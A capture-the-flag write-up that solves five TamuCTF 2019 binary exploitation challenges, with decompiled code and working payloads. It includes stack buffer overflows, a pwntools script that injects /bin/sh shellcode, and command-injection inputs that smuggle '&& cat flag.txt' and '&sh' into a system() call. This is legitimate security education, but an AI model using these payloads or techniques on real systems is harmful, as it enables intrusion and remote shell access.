---
title:  TamuCTF Pwn 1-5
date:   2019-06-25
categories: writeups
header:
    overlay_color: "#000"
    overlay_filter: "0.8"
    overlay_image: /assets/images/0fa.png
    teaser: /assets/images/0fa.png
excerpt: "Writeup for the pwn (1-5) challenges of the TamuCTF 2019"
---

## Pwn 1

The given file is a 32bits elf.

Find the binary here: [pwn1](/assets/sources/tamuctf/pwn1)


~~~ bash
file pwn1
pwn1: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped
~~~ 


Let's run it to see what's about.


~~~ bash
./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
AAAA
I don't know that! Auuuuuuuugh!
~~~ 

So it's looks like the binary want some answers from us.

I decompiled with IDA to have the pseudo code, as it will make the reversing part fast enough.

~~~ java

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [sp+1h] [bp-3Bh]@1
  int v5; // [sp+2Ch] [bp-10h]@1
  int v6; // [sp+30h] [bp-Ch]@1
  int *v7; // [sp+38h] [bp-4h]@1

  v7 = &argc;
  setvbuf(stdout, (char *)2, 0, 0);
  v6 = 2;
  v5 = 0;
  puts("Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.");
  puts("What... is your name?");
  fgets(&s, 43, stdin);
  if ( strcmp(&s, "Sir Lancelot of Camelot\n") )
  {
    puts("I don't know that! Auuuuuuuugh!");
    exit(0);
  }
  puts("What... is your quest?");
  fgets(&s, 43, stdin);
  if ( strcmp(&s, "To seek the Holy Grail.\n") )
  {
    puts("I don't know that! Auuuuuuuugh!");
    exit(0);
  }
  puts("What... is my secret?");
  gets(&s);
  if ( v5 == 0xDEA110C8 )
    print_flag();
  else
    puts("I don't know that! Auuuuuuuugh!");
  return 0;
}
~~~ 

So the binary will read 3 inputs from us and expects the "right" answer for each question.
The two first are pretty simple as it's just the good string to give.

The last check is about v5. It should be egal to `0xDEA110C8`.
Once all asnwers are corrects, it will execute the print_flag function.


As the function `gets` is vulnerable to buffer overflow we will make one to overwrite the value of v5.
Checking the file security we see that there is no canary, a bufferoverflow attack is indeed possible.

~~~ bash
checksec -f pwn1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified   Fortifiable  FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   77 Symbols      No      0  4pwn1
~~~ 
So the goal is to fill the buffer and then overwrite the value of v5.
As we can see the len of the buffer is 43 bytes.

The payload will then looks like [43bytes of junk][0xDEA110C8].
We then have to add the answers of the 2 previous questions -> [answer1][answer2][43bytes of junk][0xDEA110C8]

Let's run it.

~~~ bash
echo -e "Sir Lancelot of Camelot\nTo seek the Holy Grail.\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc8\x10\xa1\xde" | nc pwn.tamuctf.com 4321                                 139 ↵
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
gigem{34sy_CC428ECD75A0D392}
~~~ 

## Pwn 2

The given file is a 32bits elf.

Find the binary here: [pwn2](/assets/sources/tamuctf/pwn2)


Here the program asks us to execute a function given by its name.

~~~ 
./pwn2
Which function would you like to call?
one
This is function one!
~~~ 

The given IDA's pseudo code is the following:


~~~ java
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [sp+1h] [bp-27h]@1
  int *v5; // [sp+24h] [bp-4h]@1

  v5 = &argc;
  setvbuf(stdout, (char *)2, 0, 0);
  puts("Which function would you like to call?");
  gets(&s);
  select_func(&s);
  return 0;
}

int __cdecl select_func(char *src)
{
  char dest; // [sp+Eh] [bp-2Ah]@1
  int (*v3)(void); // [sp+2Ch] [bp-Ch]@1

  v3 = (int (*)(void))two;
  strncpy(&dest, src, 0x1Fu);
  if ( !strcmp(&dest, "one") )
    v3 = (int (*)(void))one;
  return v3();
}

int print_flag()
{
  char i; // al@1
  FILE *fp; // [sp+Ch] [bp-Ch]@1

  puts("This function is still under development.");
  fp = fopen("flag.txt", "r");
  for ( i = _IO_getc(fp); i != -1; i = _IO_getc(fp) )
    putchar(i);
  return putchar(10);
}

~~~ 

So we have again a bufferoverflow where the goal is to overwrite v3 with the address
of the print_flag function.

We will fill the buffer (30bytes) and overwrite the value of v3

As the address of the "print_flag" function is only one byte different from the address of the "two" function, we only need to write the LSB.

`function two's address: 0x000006AD`
`function print_flag's address: 0x000006D8`

(addresses found with IDA)

The payload will therefore be [30bytes of junk][LSB of the address to write]

Let's craft and run it!


~~~ 
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd8" |  nc pwn.tamuctf.com 4322
Which function would you like to call?
This function is still under development.
gigem{4ll_17_74k35_15_0n3}
~~~ 

## Pwn 3


The given file is a 32bits elf.

Find the binary here: [pwn3](/assets/sources/tamuctf/pwn3)

The program itself leak an address.

~~~ 
./pwn3
Take this, you might need it on your journey 0xffab239e!
AAAA
~~~ 


Let's decompile it to see what's about.

~~~ java
public echo
echo proc near

s= byte ptr -12Ah
var_4= dword ptr -4

push    ebp
mov     ebp, esp
push    ebx
sub     esp, 134h
call    __x86_get_pc_thunk_bx
add     ebx, 1A20h
sub     esp, 8
lea     eax, [ebp+s]
push    eax
lea     eax, (aTakeThisYouMig - 1FCCh)[ebx] ; "Take this, you might need it on your jo"...
push    eax             ; format
call    _printf
add     esp, 10h
sub     esp, 0Ch
lea     eax, [ebp+s]
push    eax             ; s
call    _gets
add     esp, 10h
nop
mov     ebx, [ebp+var_4]
leave
retn
echo endp

~~~ 


The program here is pretty simple. It gives us an address A, and then read our input that will be stored at this address.

So the goal is to write a shellcode, jump to the given address to execute it.
To do so, we will exploit the `gets(buff)` function with again a bufferoverflow to overwrite EIP with the address given at which is our shellcode.

As the address is not always the same, we will use pwntool to exploit the binary.
This challenge is a great one to start using pwntool as the exploit is pretty simple.

~~~ python

#!/usr/bin/env python2.7
from pwn import *

def parse(text):

    # ugly parsing
    pos = text.find("0x")
    addr = text[pos+2:pos+10]
    addr = int(addr, 16) # leak
    print(addr)

    return p32(addr)

if __name__ == '__main__':

    #e = process("./pwn3")
    e = remote("pwn.tamuctf.com", 4323)

    out = e.recvline()

    addr = parse(out)

    print("[+] Input address: " + addr)

    payload = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' # shellcode /bin/sh
    payload +='A'*281 # fill buffer
    payload += addr

    # execution
    #print(payload)
    print(e.sendline(payload))
    e.interactive()
~~~ 

As I'm not used to pwntool, I did an ugly parsing, a better way to do is to use the recvuntil() function to make the parsing.


~~~ bash

python2.7 exploit_pwn3.py
[+] Opening connection to pwn.tamuctf.com on port 4323: Done
4288163966
[+] Input addresse: ~0\x98\xff
None
[*] Switching to interactive mode
$ cat flag.txt
gigem{r3m073_fl46_3x3cu710n}

~~~ 

## Pwn 4


Find the binary here: [pwn4](/assets/sources/tamuctf/pwn4)


I think the code here had an unwanted vulnerability (hum ^^), so the method used below is, I think, not the intended one. But hey, a shell is a shell.

Let's quickly look at the code.


~~~ java
int laas()
{
  int result; // eax@2
  char s; // [sp+7h] [bp-21h]@1

  puts("ls as a service (laas)(Copyright pending)");
  puts("Enter the arguments you would like to pass to ls:");
  gets(&s);
  if ( strchr(&s, '/') )
    result = puts("No slashes allowed");
  else
    result = run_cmd((int)&s);
  return result;
}


int __cdecl run_cmd(int a1)
{
  char s; // [sp+2h] [bp-26h]@1

  snprintf(&s, 0x1Bu, "ls %s", a1);
  printf("Result of %s:\n", &s);
  return system(&s);
}
~~~ 


So it will appends our input to `ls ` and call it as an argument of the `system(input)` function.
We then can simply execute another command with the `&&` characters.

The payload will looks like this: `-a && cat flag.txt`

~~~ 
nc pwn.tamuctf.com 4324
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
-a && cat flag.txt
Result of ls -a && cat flag.txt:
.
..
flag.txt
pwn4
gigem{5y573m_0v3rfl0w}
~~~ 

## Pwn 5

Find the binary here: [pwn5](/assets/sources/tamuctf/pwn5)


~~~ java
int __cdecl run_cmd(int a1)
{
  char v2; // [sp+6h] [bp-12h]@1

  snprintf(&v2, 7, "ls %s", a1);
  printf("Result of %s:\n", &v2);
  return system(&v2);
}
~~~ 
The program here is very similar to the pwn4 challenge. The only difference is that we have less space to write our payload (7 characters - len("ls ") == 4 characters).

Once again, I think that's not the intended way of exploitation. But let's work smarter not harder this time.

With 4 characters we have enough place to complete the command as follow : `ls &sh`

~~~ 
&sh
Result of ls &sh:
flag.txt
pwn5
cat .flag.txt

ls
flag.txt
pwn5
cat flag.txt
gigem{r37urn_0r13n73d_pr4c71c3}
~~~ 
